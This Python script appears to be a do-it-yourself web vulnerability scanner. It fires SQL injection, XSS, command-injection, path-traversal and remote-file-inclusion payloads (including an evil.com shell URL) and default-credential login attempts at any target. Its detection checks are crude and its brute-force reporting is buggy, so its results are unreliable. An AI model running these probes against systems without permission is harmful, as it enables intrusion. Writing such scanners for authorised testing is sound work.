import requests
from bs4 import BeautifulSoup
from tqdm import tqdm
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import certifi
from urllib.parse import urljoin, quote
import time

# Suppress the specific warning if it appears
warnings.filterwarnings("ignore", category=UserWarning, message="The input looks more like a filename than markup")

# Setup logging
logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')

# Increase the timeout duration
REQUEST_TIMEOUT = 100  # seconds

# Define maximum retries
MAX_RETRIES = 3

# Define User-Agent header
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

def run_tests(url, links):
    vulnerabilities = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [
            executor.submit(test_sql_injection, url, links),
            executor.submit(test_xss_injection, url, links),
            executor.submit(test_command_injection, url, links),
            executor.submit(test_brute_force, url),
            executor.submit(test_directory_traversal, url, links),
            executor.submit(test_rfi, url, links),
            executor.submit(test_lfi, url, links),
            executor.submit(test_idor, url, links)
        ]

        for future in as_completed(futures):
            try:
                vulnerabilities.extend(future.result())
            except Exception as e:
                logging.error(f"Error in future: {e}")
    
    return vulnerabilities

def test_sql_injection(url, links):
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --"]
    return test_injection(url, links, sql_payloads, "sql")

def test_xss_injection(url, links):
    xss_payloads = ["<script>alert('XSS')</script>", "'\"><script>alert('XSS')</script>"]
    return test_injection(url, links, xss_payloads, "xss")

def test_command_injection(url, links):
    command_payloads = ["; ls", "&& ls", "| ls"]
    return test_injection(url, links, command_payloads, "command")

def test_brute_force(url):
    brute_force_payloads = [("admin", "admin"), ("admin", "password"), ("user", "123456")]
    vulnerabilities = []

    # Assuming the login form is at /login
    login_url = url + "/login"

    try:
        response = requests.get(login_url, headers=HEADERS, timeout=REQUEST_TIMEOUT, verify=certifi.where())
        if response.status_code == 200 and "text/html" in response.headers.get("Content-Type", ""):
            if looks_like_html(response.text):
                soup = BeautifulSoup(response.text, 'html.parser')
                form = soup.find('form')
                if form:
                    form_details = get_form_details(form)

                    with ThreadPoolExecutor(max_workers=10) as executor:
                        futures = []
                        for username, password in brute_force_payloads:
                            data = {input_tag['name']: username if 'user' in input_tag['name'].lower() else password for input_tag in form_details['inputs'] if input_tag['name']}
                            futures.append(executor.submit(submit_form, form_details, url, data))

                        for future in as_completed(futures):
                            try:
                                form_response = future.result()
                                if form_response and form_response.status_code == 200:
                                    if "login successful" in form_response.text.lower():
                                        vulnerabilities.append((login_url, "Brute Force", f"username: {username}, password: {password}", "POST"))
                            except Exception as e:
                                logging.error(f"Error in brute force future: {e}")
                else:
                    logging.error("No form found at the login URL.")
            else:
                logging.error("The response does not look like HTML.")
        else:
            logging.error("Failed to retrieve the login page.")
    except Exception as e:
        logging.error(f"Error during brute force test: {e}")

    return vulnerabilities

def test_directory_traversal(url, links):
    traversal_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    return test_injection(url, links, traversal_payloads, "traversal")

def test_rfi(url, links):
    rfi_payloads = ["http://evil.com/shell.txt"]
    return test_injection(url, links, rfi_payloads, "rfi")

def test_lfi(url, links):
    lfi_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    return test_injection(url, links, lfi_payloads, "lfi")

def test_idor(url, links):
    idor_payloads = ["?user_id=1", "?account_id=1"]
    return test_injection(url, links, idor_payloads, "idor")

def test_injection(url, links, payloads, test_type):
    vulnerabilities = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for link in links:
            for payload in payloads:
                futures.append(executor.submit(test_payload, url, link, payload, test_type))

        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    vulnerabilities.append(result)
            except Exception as e:
                logging.error(f"Error in {test_type} future: {e}")

    return vulnerabilities

def test_payload(url, link, payload, test_type):
    full_url = urljoin(link, quote(payload, safe=''))
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.get(full_url, headers=HEADERS, timeout=REQUEST_TIMEOUT, verify=certifi.where())
            if response.status_code == 200:
                if test_type == "sql" and ("syntax error" in response.text.lower() or "mysql" in response.text.lower()):
                    return (full_url, "SQL Injection", payload, "GET")
                elif test_type == "xss" and payload in response.text:
                    return (full_url, "XSS Injection", payload, "GET")
                elif test_type == "command" and ("root" in response.text.lower() or "bin" in response.text.lower()):
                    return (full_url, "Command Injection", payload, "GET")
                elif test_type == "traversal" and ("root:x" in response.text or "[extensions]" in response.text):
                    return (full_url, "Directory Traversal", payload, "GET")
                elif test_type == "rfi" and ("shell" in response.text):
                    return (full_url, "Remote File Inclusion", payload, "GET")
                elif test_type == "lfi" and ("root:x" in response.text or "[extensions]" in response.text):
                    return (full_url, "Local File Inclusion", payload, "GET")
                elif test_type == "idor" and ("user" in response.text or "account" in response.text):
                    return (full_url, "Insecure Direct Object References", payload, "GET")

            response = requests.get(link, headers=HEADERS, timeout=REQUEST_TIMEOUT, verify=certifi.where())
            if response.status_code == 200 and "text/html" in response.headers.get("Content-Type", ""):
                if looks_like_html(response.text):
                    soup = BeautifulSoup(response.text, 'html.parser')
                    forms = soup.find_all('form')
                    for form in forms:
                        form_details = get_form_details(form)
                        if form_details:
                            data = {input_tag['name']: payload for input_tag in form_details['inputs'] if input_tag['name']}
                            form_response = submit_form(form_details, url, data)
                            if form_response and form_response.status_code == 200:
                                if test_type == "sql" and ("syntax error" in form_response.text.lower() or "mysql" in form_response.text.lower()):
                                    return (full_url, "SQL Injection", payload, form_details['method'].upper())
                                elif test_type == "xss" and payload in form_response.text:
                                    return (full_url, "XSS Injection", payload, form_details['method'].upper())
                                elif test_type == "command" and ("root" in form_response.text.lower() or "bin" in form_response.text.lower()):
                                    return (full_url, "Command Injection", payload, form_details['method'].upper())
                                elif test_type == "traversal" and ("root:x" in form_response.text or "[extensions]" in form_response.text):
                                    return (full_url, "Directory Traversal", payload, form_details['method'].upper())
                                elif test_type == "rfi" and ("shell" in form_response.text):
                                    return (full_url, "Remote File Inclusion", payload, form_details['method'].upper())
                                elif test_type == "lfi" and ("root:x" in form_response.text or "[extensions]" in form_response.text):
                                    return (full_url, "Local File Inclusion", payload, form_details['method'].upper())
                                elif test_type == "idor" and ("user" in form_response.text or "account" in form_response.text):
                                    return (full_url, "Insecure Direct Object References", payload, form_details['method'].upper())
        except requests.exceptions.RequestException as e:
            # Suppress output for specific SSL errors
            if "SSL" not in str(e):
                logging.error(f"Error during {test_type} test for {full_url}: {e}")
            time.sleep(2 ** attempt)  # Exponential backoff

    return None

def get_form_details(form):
    details = {}
    action = form.attrs.get('action')
    method = form.attrs.get('method', 'get').lower()
    inputs = []
    for input_tag in form.find_all('input'):
        input_name = input_tag.attrs.get('name')
        input_type = input_tag.attrs.get('type', 'text')
        input_value = input_tag.attrs.get('value', '')
        inputs.append({'name': input_name, 'type': input_type, 'value': input_value})
    details['action'] = action if action else ""
    details['method'] = method
    details['inputs'] = inputs
    return details

def submit_form(form_details, url, data):
    target_url = urljoin(url, form_details['action']) if form_details['action'] else url
    try:
        if form_details['method'] == 'post':
            return requests.post(target_url, headers=HEADERS, data=data, timeout=REQUEST_TIMEOUT, verify=certifi.where())
        else:
            return requests.get(target_url, headers=HEADERS, params=data, timeout=REQUEST_TIMEOUT, verify=certifi.where())
    except requests.exceptions.RequestException as e:
        logging.error(f"Error submitting form to {target_url}: {e}")
        return None

def looks_like_html(text):
    """
    Helper function to check if a given text looks like HTML.
    """
    if not isinstance(text, str):
        return False
    return bool(BeautifulSoup(text, "html.parser").find())